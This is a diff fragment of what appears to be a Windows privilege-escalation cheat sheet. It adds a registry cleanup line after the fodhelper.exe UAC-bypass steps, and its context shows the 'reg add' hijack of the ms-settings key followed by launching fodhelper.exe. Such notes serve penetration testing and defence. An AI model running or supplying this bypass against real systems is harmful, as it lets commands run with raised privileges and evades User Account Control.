@@ -286,6 +286,9 @@ C:\> reg add %REG_KEY% /d %CMD% /f
 The operation completed successfully.
 
 run fodhelper.exe
+
+reg delete HKCU\Software\Classes\ms-settings\ /f
+
 ```
 
 # Read Permissions
